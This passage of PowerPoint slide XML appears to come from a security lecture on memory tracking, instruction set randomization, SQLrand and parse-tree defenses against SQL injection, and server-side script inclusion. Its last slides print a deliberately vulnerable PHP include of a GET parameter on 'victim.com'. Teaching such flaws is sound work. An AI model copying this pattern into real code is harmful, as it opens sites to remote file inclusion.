          <p:nvSpPr>
            <p:cNvPr id="49" name="Rectangle 48"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5974138" y="4472244"/>
              <a:ext cx="1268958" cy="297993"/>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0xABCD</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Slide Number Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{4F16CFC1-D6E9-5244-A559-738FECFB22C9}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>81</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Rectangle 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1299704" y="5409345"/>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0xF</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1301899" y="5739260"/>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0xF</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Rectangle 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1299704" y="6524276"/>
            <a:ext cx="1215331" cy="300400"/>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/0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2743198" y="5409345"/>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36" name="Rectangle 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2745393" y="5739260"/>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37" name="Rectangle 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2743198" y="6496966"/>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41" name="TextBox 40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="72153" y="6156295"/>
            <a:ext cx="1119017"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Memory</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="TextBox 41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3960724" y="6156295"/>
            <a:ext cx="220779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Shadow Memory</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Rectangle 42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7709159" y="2055862"/>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44" name="Rectangle 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7711354" y="2385777"/>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45" name="Rectangle 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7709159" y="3143483"/>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48" name="Rectangle 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7709159" y="4145059"/>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X</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="Rectangle 50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7697699" y="4495828"/>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solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>X</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="Rectangle 51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7711354" y="4852180"/>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NULL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="Rectangle 52"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7697699" y="5660532"/>
            <a:ext cx="1215331" cy="300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NULL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20660900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lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Emulator (e.g., QEMU)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>You can program a CPU</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Just-In-Time Compiler (e.g., Intel PIN)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Dynamically instrument binaries</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16801805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Set Randomization</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="792017" y="2419077"/>
            <a:ext cx="2376039" cy="464254"/>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Instruction</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Oval 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1406508" y="4164639"/>
            <a:ext cx="1146983" cy="114698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t>CPU</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="792017" y="1916063"/>
            <a:ext cx="2376039" cy="464254"/>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Injected Instruction</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Oval 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5259522" y="4155393"/>
            <a:ext cx="1146983" cy="114698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t>CPU</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4658616" y="2380317"/>
            <a:ext cx="2376039" cy="464254"/>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Instruction</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7268759" y="3311020"/>
            <a:ext cx="1240521" cy="464254"/>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KEY</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="11" name="Straight Arrow Connector 10"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="8" idx="2"/>
            <a:endCxn id="12" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5846636" y="2844571"/>
            <a:ext cx="0" cy="4801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226375" y="3324673"/>
            <a:ext cx="1240521" cy="464254"/>
          </a:xfrm>
          <a:prstGeom prst="rect">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decrypt</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="13" name="Straight Arrow Connector 12"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="9" idx="1"/>
            <a:endCxn id="12" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6466896" y="3543147"/>
            <a:ext cx="801863" cy="136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12" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="5842393" y="3788927"/>
            <a:ext cx="4243" cy="31185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654373" y="1879498"/>
            <a:ext cx="2376039" cy="464254"/>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Injected Instruction</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="23" name="Straight Arrow Connector 22"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="4" idx="2"/>
            <a:endCxn id="5" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="1980000" y="2883331"/>
            <a:ext cx="37" cy="12813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66836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lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>E.g., Using Intel PIN</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nsl.cs.columbia.edu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/projects/minestrone/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>isr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28813186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a:t>SQLrand</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0"/>
              <a:t>: Preventing SQL Injection Attacks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A protection mechanism against SQL injection attacks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Similar to instruction set randomization.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37678492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Architecture</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="314065" y="1776008"/>
            <a:ext cx="8089298" cy="3726777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10768350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Randomization</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Identify keywords in an SQL statement</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Rewrite all keywords with the random key appended. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="60752" y="3810746"/>
            <a:ext cx="4504511" cy="1640716"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1">
                <a:lumMod val="60000"/>
                <a:lumOff val="40000"/>
              </a:schemeClr>
            </a:solidFill>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3868839" y="4862147"/>
            <a:ext cx="5030403" cy="1514530"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1">
                <a:lumMod val="75000"/>
              </a:schemeClr>
            </a:solidFill>
          </a:ln>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1951530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De-randomization</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Identify terms/keywords (e.g., starting from the original keywords)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>E.g., select123 or select456 or select</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Evaluate the format</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Keyword + random number</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Detect mal-formed keywords</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Stripping away the random number</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Send it to the DBMS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30091047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Parse Tree Validation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Detect SQL injection attacks at runtime.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Observation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>All SQL injections alter the structure of the query intended by the programmer.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18870958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an SQL Query</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1286135"/>
            <a:ext cx="8229600" cy="639147"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Parse tree of an intended query</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="872806" y="2692399"/>
            <a:ext cx="7649592" cy="2564603"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40212085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an SQL Query</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1286135"/>
            <a:ext cx="8229600" cy="639147"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Parse tree of an injected query</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="620321" y="2870199"/>
            <a:ext cx="8180522" cy="2168331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9048008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an SQL Query</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1286135"/>
            <a:ext cx="8229600" cy="639147"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Parse tree of an injected query</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="777217" y="2679700"/>
            <a:ext cx="7783291" cy="2631922"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22897360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Server-Side Script Inclusion Vulnerabilities</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Server Side Script (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>index.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>victim.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	include(“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>header.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>”);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	include($_GET[‘page’].”.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>”);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	include(“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>footer.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>”);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>?&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22318516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Intended Use</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>victim.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>index.php?page</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=news</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	include(“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>header.html</a:t>
